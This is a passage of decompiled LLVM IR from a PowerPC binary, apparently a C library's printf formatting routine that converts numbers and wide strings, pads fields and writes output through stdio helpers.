  %v0_10003970 = load i32, i32* @r1, align 4
  %v2_10003970 = add i32 %v0_10003970, %v1_1000396c
  %v1_10003974 = add i32 %v2_10003970, 188
  %v2_10003974 = inttoptr i32 %v1_10003974 to i32*
  %v3_10003974 = load i32, i32* %v2_10003974, align 4
  store i32 %v3_10003974, i32* %r0.global-to-local, align 4
  %v1_10003978 = call i32 @__asm_rlwinm(i32 %v3_10003974, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000397c

dec_label_pc_1000397c:                            ; preds = %dec_label_pc_10003960, %dec_label_pc_1000396c
  %v3_1000397c = load i32, i32* %stack_var_-344, align 4
  %v0_10003980 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10003980, i32* @r5, align 4
  %v2_10003984 = inttoptr i32 %v0_10003980 to i32*
  %v3_10003984 = call i32 @_load_inttype(i32 %v3_1000397c, i32* %v2_10003984)
  %v0_10003994 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10003994, i32* %r8.global-to-local, align 4
  %v6_1000399c = call i32 @_uintmaxtostr(i8* %v5_1000399c, i32 %v3_10003984, i32 %v3_1000397c, i32 %v0_10003980, i32 %v0_10003994)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000399c, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_100039f0, label %dec_label_pc_100039b0

dec_label_pc_100039b0:                            ; preds = %dec_label_pc_1000397c
  %v7_1000399c = inttoptr i32 %v6_1000399c to i8*
  %v3_100039b0 = load i8, i8* %v7_1000399c, align 1
  %v4_100039b0 = zext i8 %v3_100039b0 to i32
  store i32 %v4_100039b0, i32* %r0.global-to-local, align 4
  %v3_100039b8 = icmp eq i8 %v3_100039b0, 45
  br i1 %v3_100039b8, label %dec_label_pc_100039c0, label %dec_label_pc_100039d4

dec_label_pc_100039c0:                            ; preds = %dec_label_pc_100039b0
  %v1_100039c0 = or i32 %v0_100039e4, 2
  store i32 %v1_100039c0, i32* %r0.global-to-local, align 4
  %v2_100039c4 = add i32 %v6_1000399c, 1
  store i32 %v2_100039c4, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_100039f0

dec_label_pc_100039d4:                            ; preds = %dec_label_pc_100039b0
  %v1_100039d4 = and i32 %v0_100039e4, 2
  store i32 %v1_100039d4, i32* %r0.global-to-local, align 4
  %v3_100039d4 = icmp eq i32 %v1_100039d4, 0
  br i1 %v3_100039d4, label %dec_label_pc_100039e4, label %dec_label_pc_100039dc

dec_label_pc_100039dc:                            ; preds = %dec_label_pc_100039d4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_100039f0

dec_label_pc_100039e4:                            ; preds = %dec_label_pc_100039d4
  %v1_100039e4 = urem i32 %v0_100039e4, 2
  store i32 %v1_100039e4, i32* %r11.global-to-local, align 4
  %v3_100039e4 = icmp eq i32 %v1_100039e4, 0
  br i1 %v3_100039e4, label %dec_label_pc_100039f0, label %dec_label_pc_100039ec

dec_label_pc_100039ec:                            ; preds = %dec_label_pc_100039e4
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_100039f0

dec_label_pc_100039f0:                            ; preds = %dec_label_pc_100039e4, %dec_label_pc_1000397c, %dec_label_pc_100039dc, %dec_label_pc_100039c0, %dec_label_pc_100039ec
  %v0_10003a5c = phi i32 [ %v6_1000399c, %dec_label_pc_1000397c ], [ %v2_100039c4, %dec_label_pc_100039c0 ], [ %v6_1000399c, %dec_label_pc_100039e4 ], [ %v6_1000399c, %dec_label_pc_100039ec ], [ %v6_1000399c, %dec_label_pc_100039dc ]
  %stack_var_-184.0 = phi i32 [ %v0_100039e4, %dec_label_pc_1000397c ], [ %v1_100039c0, %dec_label_pc_100039c0 ], [ %v0_100039e4, %dec_label_pc_100039e4 ], [ %v0_100039e4, %dec_label_pc_100039ec ], [ %v0_100039e4, %dec_label_pc_100039dc ]
  %v3_100039f0 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10003c04, i32* %r0.global-to-local, align 4
  %v2_100039f8 = sub i32 %v2_10003c04, %v0_10003a5c
  %v1_10003a00 = add i32 %v2_100039f8, 127
  store i32 %v1_10003a00, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_100039f0, -1
  br i1 %tmp76, label %dec_label_pc_10003a0c, label %dec_label_pc_10003a08

dec_label_pc_10003a08:                            ; preds = %dec_label_pc_100039f0
  br label %dec_label_pc_10003a0c

dec_label_pc_10003a0c:                            ; preds = %dec_label_pc_100039f0, %dec_label_pc_10003a08
  %v0_10003a40 = phi i32 [ %v3_100039f0, %dec_label_pc_100039f0 ], [ 1, %dec_label_pc_10003a08 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10003a10 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10003a10, i32* %r11.global-to-local, align 4
  %v3_10003a10 = icmp eq i32 %v1_10003a10, 0
  br i1 %v3_10003a10, label %dec_label_pc_10003a5c, label %dec_label_pc_10003a18

dec_label_pc_10003a18:                            ; preds = %dec_label_pc_10003a0c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10003a1c, label %dec_label_pc_10003a28, label %dec_label_pc_10003a38.thread

dec_label_pc_10003a38.thread:                     ; preds = %dec_label_pc_10003a18
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10003a5c

dec_label_pc_10003a28:                            ; preds = %dec_label_pc_10003a18
  br i1 %v3_10003a28, label %dec_label_pc_10003a30, label %dec_label_pc_10003a38

dec_label_pc_10003a30:                            ; preds = %dec_label_pc_10003a28
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10003a5c

dec_label_pc_10003a38:                            ; preds = %dec_label_pc_10003a28
  br i1 %v3_10003a38, label %dec_label_pc_10003a40, label %dec_label_pc_10003a5c

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a38
  %v3_10003a40 = icmp ugt i32 %v0_10003a40, %v1_10003a00
  br i1 %v3_10003a40, label %dec_label_pc_10003a5c, label %dec_label_pc_10003a48

dec_label_pc_10003a48:                            ; preds = %dec_label_pc_10003a40
  %v1_10003a48 = inttoptr i32 %v0_10003a5c to i8*
  %v2_10003a48 = load i8, i8* %v1_10003a48, align 1
  %v3_10003a48 = zext i8 %v2_10003a48 to i32
  store i32 %v3_10003a48, i32* %r0.global-to-local, align 4
  %v3_10003a50 = icmp eq i8 %v2_10003a48, 48
  br i1 %v3_10003a50, label %dec_label_pc_10003a5c, label %dec_label_pc_10003a58

dec_label_pc_10003a58:                            ; preds = %dec_label_pc_10003a48
  %v1_10003a58 = add i32 %v2_100039f8, 128
  br label %dec_label_pc_10003a5c

dec_label_pc_10003a5c:                            ; preds = %dec_label_pc_10003a38.thread, %dec_label_pc_10003a38, %dec_label_pc_10003a48, %dec_label_pc_10003a40, %dec_label_pc_10003a0c, %dec_label_pc_10003a30, %dec_label_pc_10003a58
  %v1_10003aa4 = phi i32 [ %v0_10003a40, %dec_label_pc_10003a38 ], [ 1, %dec_label_pc_10003a48 ], [ %v0_10003a40, %dec_label_pc_10003a40 ], [ %v0_10003a40, %dec_label_pc_10003a0c ], [ %v0_10003a40, %dec_label_pc_10003a30 ], [ %v1_10003a58, %dec_label_pc_10003a58 ], [ %v0_10003a40, %dec_label_pc_10003a38.thread ]
  %v1_10003a5c = inttoptr i32 %v0_10003a5c to i8*
  %v2_10003a5c = load i8, i8* %v1_10003a5c, align 1
  %v3_10003a5c = zext i8 %v2_10003a5c to i32
  store i32 %v3_10003a5c, i32* %r0.global-to-local, align 4
  %v3_10003a60 = icmp eq i8 %v2_10003a5c, 48
  br i1 %v3_10003a60, label %dec_label_pc_10003a68, label %dec_label_pc_10003aa0

dec_label_pc_10003a68:                            ; preds = %dec_label_pc_10003a5c
  %v0_10003a68 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_10003a68, 6
  br i1 %tmp77, label %dec_label_pc_10003a74, label %dec_label_pc_10003a70

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a68
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10003a74

dec_label_pc_10003a74:                            ; preds = %dec_label_pc_10003a68, %dec_label_pc_10003a70
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10003a78, label %dec_label_pc_10003a80, label %dec_label_pc_10003a90

dec_label_pc_10003a80:                            ; preds = %dec_label_pc_10003a74
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000bcc0.358 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c1c

dec_label_pc_10003a90:                            ; preds = %dec_label_pc_10003a74
  %v3_10003a90 = icmp eq i32 %v1_10003aa4, 0
  br i1 %v3_10003a90, label %dec_label_pc_10003a98, label %dec_label_pc_10003aa0

dec_label_pc_10003a98:                            ; preds = %dec_label_pc_10003a90
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003c1c

dec_label_pc_10003aa0:                            ; preds = %dec_label_pc_10003a90, %dec_label_pc_10003a5c
  %v3_10003aa0 = icmp ugt i32 %v1_10003aa4, %v1_10003a00
  %v2_10003aa4 = sub i32 %v1_10003aa4, %v1_10003a00
  store i32 %v2_10003aa4, i32* %r29.global-to-local, align 4
  br i1 %v3_10003aa0, label %dec_label_pc_10003c3cthread-pre-split, label %dec_label_pc_10003c1c

dec_label_pc_10003ab0:                            ; preds = %dec_label_pc_100038d0
  br i1 %v2_10003ab0, label %dec_label_pc_10003ae4, label %dec_label_pc_10003ab8

dec_label_pc_10003ab8:                            ; preds = %dec_label_pc_10003ab0
  %v3_10003ab8 = load i32, i32* %stack_var_-344, align 4
  %v0_10003ac4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268450516, i32* @lr, align 4
  %v5_10003ad0 = call i32 @_fpmaxtostr(i32 %v0_10003ac4, i32* nonnull %stack_var_-196, i32 268449452, i32 %v3_10003ab8)
  %v1_10003ad4 = icmp slt i32 %v5_10003ad0, 0
  br i1 %v1_10003ad4, label %dec_label_pc_10003da0, label %dec_label_pc_10003adc

dec_label_pc_10003adc:                            ; preds = %dec_label_pc_10003ab8
  %v0_10003adc = load i32, i32* %r23.global-to-local, align 4
  %v2_10003adc = add i32 %v0_10003adc, %v5_10003ad0
  store i32 %v2_10003adc, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10003d8c

dec_label_pc_10003ae4:                            ; preds = %dec_label_pc_10003ab0
  br i1 %v2_10003ae4, label %dec_label_pc_10003b8c, label %dec_label_pc_10003aec

dec_label_pc_10003aec:                            ; preds = %dec_label_pc_10003ae4
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10003af8 = load i32, i32* %stack_var_-344, align 4
  %v1_10003b00 = inttoptr i32 %v3_10003af8 to i32*
  %v2_10003b00 = load i32, i32* %v1_10003b00, align 4
  br i1 %v3_10003ae4, label %dec_label_pc_10003b00, label %dec_label_pc_10003b54

dec_label_pc_10003b00:                            ; preds = %dec_label_pc_10003aec
  store i32 %v2_10003b00, i32* %r0.global-to-local, align 4
  %v3_10003b04 = icmp eq i32 %v2_10003b00, 0
  store i32 %v2_10003b00, i32* %stack_var_-340, align 4
  br i1 %v3_10003b04, label %dec_label_pc_10003c24, label %dec_label_pc_10003b10

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003b00
  %v3_10003b10 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10003b10, i32* %r0.global-to-local, align 4
  %v1_10003b18 = icmp slt i32 %v3_10003b10, 0
  br i1 %v1_10003b18, label %dec_label_pc_10003b24, label %dec_label_pc_10003b20

dec_label_pc_10003b20:                            ; preds = %dec_label_pc_10003b10
  br label %dec_label_pc_10003b24

dec_label_pc_10003b24:                            ; preds = %dec_label_pc_10003b10, %dec_label_pc_10003b20
  %storemerge94 = phi i32 [ %v3_10003b10, %dec_label_pc_10003b20 ], [ -1, %dec_label_pc_10003b10 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_10003b24, i32* @r3, align 4
  store i32 %v2_10003b28, i32* @r6, align 4
  store i32 %v2_10003b24, i32* @r4, align 4
  store i32 268450612, i32* @lr, align 4
  %v0_10003b30 = call i32 @__GI_wcsrtombs()
  %v3_10003b34 = icmp eq i32 %v0_10003b30, -1
  store i32 %v0_10003b30, i32* @r31, align 4
  br i1 %v3_10003b34, label %dec_label_pc_10003da0, label %dec_label_pc_10003b40

dec_label_pc_10003b40:                            ; preds = %dec_label_pc_10003b24
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c3c

dec_label_pc_10003b54:                            ; preds = %dec_label_pc_10003aec
  store i32 %v2_10003c04, i32* @r28, align 4
  store i32 268450664, i32* @lr, align 4
  %v3_10003b64 = call i32 @__GI_wcrtomb(i32 %v2_10003c04, i32 %v2_10003b00, i32 %v2_10003b28)
  %v3_10003b68 = icmp eq i32 %v3_10003b64, -1
  store i32 %v3_10003b64, i32* @r31, align 4
  br i1 %v3_10003b68, label %dec_label_pc_10003da0, label %dec_label_pc_10003b74

dec_label_pc_10003b74:                            ; preds = %dec_label_pc_10003b54
  store i32 %v2_10003c04, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10003b84 = load i32, i32* @r25, align 4
  %v1_10003b84 = load i32, i32* @r28, align 4
  %v3_10003b84 = trunc i32 %v0_10003b84 to i8
  %v4_10003b84 = add i32 %v1_10003b84, %v3_10003b64
  %v5_10003b84 = inttoptr i32 %v4_10003b84 to i8*
  store i8 %v3_10003b84, i8* %v5_10003b84, align 1
  %v0_10003c40.pre.pre = load i32, i32* @r31, align 4
  %v1_10003c40.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10003c3cthread-pre-split

dec_label_pc_10003b8c:                            ; preds = %dec_label_pc_10003ae4
  br i1 %v2_10003b8c, label %dec_label_pc_10003bf8, label %dec_label_pc_10003b94

dec_label_pc_10003b94:                            ; preds = %dec_label_pc_10003b8c
  %v3_10003b98 = load i32, i32* %stack_var_-344, align 4
  %v1_10003ba0 = inttoptr i32 %v3_10003b98 to i32*
  %v2_10003ba0 = load i32, i32* %v1_10003ba0, align 4
  br i1 %v3_10003b8c, label %dec_label_pc_10003ba0, label %dec_label_pc_10003bd0

dec_label_pc_10003ba0:                            ; preds = %dec_label_pc_10003b94
  store i32 %v2_10003ba0, i32* %r30.global-to-local, align 4
  %v3_10003ba4 = icmp eq i32 %v2_10003ba0, 0
  br i1 %v3_10003ba4, label %dec_label_pc_10003c24, label %dec_label_pc_10003bac

dec_label_pc_10003bac:                            ; preds = %dec_label_pc_10003ba0, %dec_label_pc_10003c00
  %v0_10003bc0 = phi i32 [ %v2_10003ba0, %dec_label_pc_10003ba0 ], [ %v3_10003c10, %dec_label_pc_10003c00 ]
  %v3_10003bac = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10003bac, i32* %r0.global-to-local, align 4
  %v1_10003bb4 = icmp slt i32 %v3_10003bac, 0
  br i1 %v1_10003bb4, label %dec_label_pc_10003bc0, label %dec_label_pc_10003bbc

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003bac
  br label %dec_label_pc_10003bc0

dec_label_pc_10003bc0:                            ; preds = %dec_label_pc_10003bac, %dec_label_pc_10003bbc
  %storemerge95 = phi i32 [ %v3_10003bac, %dec_label_pc_10003bbc ], [ -1, %dec_label_pc_10003bac ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268450760, i32* @lr, align 4
  %v1_10003bc4 = inttoptr i32 %v0_10003bc0 to i8*
  %v2_10003bc4 = call i32 @strnlen(i8* %v1_10003bc4)
  store i32 %v2_10003bc4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003c30

dec_label_pc_10003bd0:                            ; preds = %dec_label_pc_10003b94
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10003ba0, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10003c04, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c3cthread-pre-split

dec_label_pc_10003bf8:                            ; preds = %dec_label_pc_10003b8c
  br i1 %v3_10003bf8, label %dec_label_pc_10003c00, label %dec_label_pc_10003da0

dec_label_pc_10003c00:                            ; preds = %dec_label_pc_10003bf8
  %v0_10003c00 = call i32 @__errno_location()
  %v1_10003c08 = inttoptr i32 %v0_10003c00 to i32*
  %v2_10003c08 = load i32, i32* %v1_10003c08, align 4
  store i32 %v2_10003c08, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268450836, i32* @lr, align 4
  %v3_10003c10 = call i32 @__GI___glibc_strerror_r(i32 %v2_10003c08, i32 %v2_10003c04, i32 128)
  store i32 %v3_10003c10, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003bac

dec_label_pc_10003c1c:                            ; preds = %dec_label_pc_10003aa0, %dec_label_pc_10003a98, %dec_label_pc_10003a80
  %v0_10003c40.pre41 = phi i32 [ %v1_10003a00, %dec_label_pc_10003aa0 ], [ 0, %dec_label_pc_10003a98 ], [ 5, %dec_label_pc_10003a80 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10003c3cthread-pre-split

dec_label_pc_10003c24:                            ; preds = %dec_label_pc_10003ba0, %dec_label_pc_10003b00
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000bcc8.359 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003c30

dec_label_pc_10003c30:                            ; preds = %dec_label_pc_10003bc0, %dec_label_pc_10003c24
  %v0_10003c4029 = phi i32 [ %v2_10003bc4, %dec_label_pc_10003bc0 ], [ 6, %dec_label_pc_10003c24 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10003c3c

dec_label_pc_10003c3cthread-pre-split:            ; preds = %dec_label_pc_10003b74, %dec_label_pc_10003bd0, %dec_label_pc_10003c1c, %dec_label_pc_10003aa0
  %v1_10003c40.pre = phi i32 [ %v2_10003aa4, %dec_label_pc_10003aa0 ], [ 0, %dec_label_pc_10003c1c ], [ %v1_10003c40.pre.pre, %dec_label_pc_10003b74 ], [ 0, %dec_label_pc_10003bd0 ]
  %v0_10003c40.pre = phi i32 [ %v1_10003a00, %dec_label_pc_10003aa0 ], [ %v0_10003c40.pre41, %dec_label_pc_10003c1c ], [ %v0_10003c40.pre.pre, %dec_label_pc_10003b74 ], [ 1, %dec_label_pc_10003bd0 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10003aa0 ], [ %stack_var_-184.0, %dec_label_pc_10003c1c ], [ %v0_100039e4, %dec_label_pc_10003b74 ], [ %v0_100039e4, %dec_label_pc_10003bd0 ]
  %v0_10003c3c.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10003c3c

dec_label_pc_10003c3c:                            ; preds = %dec_label_pc_10003c3cthread-pre-split, %dec_label_pc_10003b40, %dec_label_pc_10003c30
  %v1_10003c40 = phi i32 [ %v1_10003c40.pre, %dec_label_pc_10003c3cthread-pre-split ], [ 0, %dec_label_pc_10003b40 ], [ 0, %dec_label_pc_10003c30 ]
  %v0_10003c40 = phi i32 [ %v0_10003c40.pre, %dec_label_pc_10003c3cthread-pre-split ], [ %v0_10003b30, %dec_label_pc_10003b40 ], [ %v0_10003c4029, %dec_label_pc_10003c30 ]
  %v0_10003c48 = phi i32 [ %v0_10003c3c.pr, %dec_label_pc_10003c3cthread-pre-split ], [ 11, %dec_label_pc_10003b40 ], [ 11, %dec_label_pc_10003c30 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10003c3cthread-pre-split ], [ %v0_100039e4, %dec_label_pc_10003b40 ], [ %v0_100039e4, %dec_label_pc_10003c30 ]
  %v3_10003c3c = icmp eq i32 %v0_10003c48, 11
  %v2_10003c40 = add i32 %v0_10003c40, %v1_10003c40
  store i32 %v2_10003c40, i32* %r0.global-to-local, align 4
  br i1 %v3_10003c3c, label %dec_label_pc_10003c5c, label %dec_label_pc_10003c48

dec_label_pc_10003c48:                            ; preds = %dec_label_pc_10003c3c
  %v0_10003c4c = call i32 @__asm_mfcr()
  %v1_10003c50 = call i32 @__asm_rlwinm(i32 %v0_10003c4c, i32 30, i32 31, i32 31)
  %v1_10003c54 = add i32 %v1_10003c50, 1
  %v0_10003c58 = load i32, i32* %r0.global-to-local, align 4
  %v2_10003c58 = add i32 %v0_10003c58, %v1_10003c54
  store i32 %v2_10003c58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10003c5c

dec_label_pc_10003c5c:                            ; preds = %dec_label_pc_10003c3c, %dec_label_pc_10003c48
  %v0_10003c74 = phi i32 [ %v2_10003c40, %dec_label_pc_10003c3c ], [ %v2_10003c58, %dec_label_pc_10003c48 ]
  %v3_10003c64 = icmp ugt i32 %tmp, %v0_10003c74
  br i1 %v3_10003c64, label %dec_label_pc_10003c6c, label %dec_label_pc_10003c70

dec_label_pc_10003c6c:                            ; preds = %dec_label_pc_10003c5c
  %v2_10003c6c = sub i32 %tmp, %v0_10003c74
  br label %dec_label_pc_10003c70

dec_label_pc_10003c70:                            ; preds = %dec_label_pc_10003c5c, %dec_label_pc_10003c6c
  %storemerge93 = phi i32 [ %v2_10003c6c, %dec_label_pc_10003c6c ], [ 0, %dec_label_pc_10003c5c ]
  %v1_10003c80 = phi i32 [ %v2_10003c6c, %dec_label_pc_10003c6c ], [ 0, %dec_label_pc_10003c5c ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10003c70 = load i32, i32* @r26, align 4
  %v3_10003c70 = icmp eq i32 %v0_10003c70, 48
  %v2_10003c74 = add i32 %v1_10003c80, %v0_10003c74
  store i32 %v2_10003c74, i32* %r0.global-to-local, align 4
  %v0_10003c78 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003c78 = add i32 %v0_10003c78, %v2_10003c74
  store i32 %v2_10003c78, i32* %r23.global-to-local, align 4
  br i1 %v3_10003c70, label %dec_label_pc_10003c80, label %dec_label_pc_10003c88

dec_label_pc_10003c80:                            ; preds = %dec_label_pc_10003c70
  %v0_10003c80 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003c80 = add i32 %v0_10003c80, %v1_10003c80
  store i32 %v2_10003c80, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10003c88

dec_label_pc_10003c88:                            ; preds = %dec_label_pc_10003c70, %dec_label_pc_10003c80
  %v0_10003c9c = phi i32 [ %v1_10003c80, %dec_label_pc_10003c70 ], [ 0, %dec_label_pc_10003c80 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10003c8c = and i32 %stack_var_-184.1, 8
  %v3_10003c8c = icmp eq i32 %v1_10003c8c, 0
  br i1 %v3_10003c8c, label %dec_label_pc_10003c94, label %dec_label_pc_10003cb0

dec_label_pc_10003c94:                            ; preds = %dec_label_pc_10003c88
  %v0_10003c94 = load i32, i32* %r24.global-to-local, align 4
  store i32 268450980, i32* @lr, align 4
  %v4_10003ca0 = call i32 @_charpad(i32 %v0_10003c94, i8 32, i32 %v0_10003c9c)
  %v1_10003ca4 = load i32, i32* @r28, align 4
  %v4_10003ca4 = icmp eq i32 %v4_10003ca0, %v1_10003ca4
  br i1 %v4_10003ca4, label %dec_label_pc_10003cac, label %dec_label_pc_10003da0

dec_label_pc_10003cac:                            ; preds = %dec_label_pc_10003c94
  br label %dec_label_pc_10003cb0

dec_label_pc_10003cb0:                            ; preds = %dec_label_pc_10003c88, %dec_label_pc_10003cac
  %v0_10003cb4 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003cbc = load i32, i32* @r27, align 4
  %v2_10003cbc = add i32 %v0_10003cbc, ptrtoint (i32* @global_var_1000bcd0.360 to i32)
  store i32 268451012, i32* @lr, align 4
  %v2_10003cc0 = call i32 @__GI_fputs_unlocked(i32 %v2_10003cbc, i32 %v0_10003cb4)
  %v0_10003ccc = load i32, i32* @r29, align 4
  store i32 268451028, i32* @lr, align 4
  %v4_10003cd0 = call i32 @_charpad(i32 %v0_10003cb4, i8 48, i32 %v0_10003ccc)
  %v1_10003cd4 = load i32, i32* @r29, align 4
  %v4_10003cd4 = icmp eq i32 %v4_10003cd0, %v1_10003cd4
  br i1 %v4_10003cd4, label %dec_label_pc_10003cdc, label %dec_label_pc_10003da0

dec_label_pc_10003cdc:                            ; preds = %dec_label_pc_10003cb0
  %v3_10003cdc = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10003cdc, i32* %r0.global-to-local, align 4
  %v3_10003ce0 = icmp eq i32 %v3_10003cdc, 0
  br i1 %v3_10003ce0, label %dec_label_pc_10003ce8, label %dec_label_pc_10003d10

dec_label_pc_10003ce8:                            ; preds = %dec_label_pc_10003cdc
  %v0_10003ce8 = load i32, i32* @r31, align 4
  %v3_10003ce8 = icmp eq i32 %v0_10003ce8, 0
  br i1 %v3_10003ce8, label %dec_label_pc_10003d04.thread, label %dec_label_pc_10003d04

dec_label_pc_10003d04.thread:                     ; preds = %dec_label_pc_10003ce8
  br label %dec_label_pc_10003d74

dec_label_pc_10003d04:                            ; preds = %dec_label_pc_10003ce8
  %v0_10003cf4 = load i32, i32* @r30, align 4
  %v0_10003cfc = load i32, i32* %r24.global-to-local, align 4
  store i32 268451076, i32* @lr, align 4
  %v4_10003d00 = inttoptr i32 %v0_10003cfc to i16*
  %v5_10003d00 = call i32 @__stdio_fwrite(i32 %v0_10003cf4, i32 %v0_10003ce8, i16* %v4_10003d00)
  %v1_10003d04.pre = load i32, i32* @r31, align 4
  %v4_10003d04 = icmp eq i32 %v5_10003d00, %v1_10003d04.pre
  br i1 %v4_10003d04, label %dec_label_pc_10003d74, label %dec_label_pc_10003da0

dec_label_pc_10003d10:                            ; preds = %dec_label_pc_10003cdc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10003d54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10003d54

dec_label_pc_10003d1c:                            ; preds = %dec_label_pc_10003d54
  %tmp78 = icmp ult i32 %v0_10003d6c, 129
  br i1 %tmp78, label %dec_label_pc_10003d24, label %dec_label_pc_10003d20

dec_label_pc_10003d20:                            ; preds = %dec_label_pc_10003d1c
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_10003d24

dec_label_pc_10003d24:                            ; preds = %dec_label_pc_10003d1c, %dec_label_pc_10003d20
  store i32 ptrtoint (i32* @global_var_10003d28.361 to i32), i32* @lr, align 4
  %v0_10003d24 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10003d24, i32* @r30, align 4
  %v3_10003d2c = icmp eq i32 %v0_10003d24, 0
  br i1 %v3_10003d2c, label %dec_label_pc_10003d48, label %dec_label_pc_10003d40

dec_label_pc_10003d40:                            ; preds = %dec_label_pc_10003d24
  %v0_10003d30 = load i32, i32* %r24.global-to-local, align 4
  store i32 268451140, i32* @lr, align 4
  %v3_10003d40 = inttoptr i32 %v0_10003d30 to i16*
  %v4_10003d40 = call i32 @__stdio_fwrite(i32 %v2_10003c04, i32 %v0_10003d24, i16* %v3_10003d40)
  store i32 %v4_10003d40, i32* %r0.global-to-local, align 4
  %v1_10003d48.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10003d48

dec_label_pc_10003d48:                            ; preds = %dec_label_pc_10003d24, %dec_label_pc_10003d40
  %v1_10003d48 = phi i32 [ 0, %dec_label_pc_10003d24 ], [ %v1_10003d48.pre, %dec_label_pc_10003d40 ]
  %v0_10003d4c = phi i32 [ 0, %dec_label_pc_10003d24 ], [ %v4_10003d40, %dec_label_pc_10003d40 ]
  %v4_10003d48 = icmp eq i32 %v0_10003d4c, %v1_10003d48
  %v1_10003d4c = load i32, i32* @r31, align 4
  %v2_10003d4c = sub i32 %v1_10003d4c, %v0_10003d4c
  store i32 %v2_10003d4c, i32* @r31, align 4
  br i1 %v4_10003d48, label %dec_label_pc_10003d54, label %dec_label_pc_10003da0

dec_label_pc_10003d54:                            ; preds = %dec_label_pc_10003d48, %dec_label_pc_10003d10
  %v0_10003d6c = phi i32 [ %v2_10003d4c, %dec_label_pc_10003d48 ], [ %v0_10003d54.pre, %dec_label_pc_10003d10 ]
  %v3_10003d54 = icmp eq i32 %v0_10003d6c, 0
  store i32 %v2_10003c04, i32* @r29, align 4
  store i32 %v2_10003b24, i32* @r4, align 4
  store i32 %v2_10003b28, i32* @r6, align 4
  store i32 %v2_10003c04, i32* @r3, align 4
  store i32 %v0_10003d6c, i32* @r5, align 4
  br i1 %v3_10003d54, label %dec_label_pc_10003d74, label %dec_label_pc_10003d1c

dec_label_pc_10003d74:                            ; preds = %dec_label_pc_10003d54, %dec_label_pc_10003d04.thread, %dec_label_pc_10003d04
  %v0_10003d74 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003d7c = load i32, i32* @r28, align 4
  store i32 268451204, i32* @lr, align 4
  %v4_10003d80 = call i32 @_charpad(i32 %v0_10003d74, i8 32, i32 %v0_10003d7c)
  %v1_10003d84 = load i32, i32* @r28, align 4
  %v4_10003d84 = icmp eq i32 %v4_10003d80, %v1_10003d84
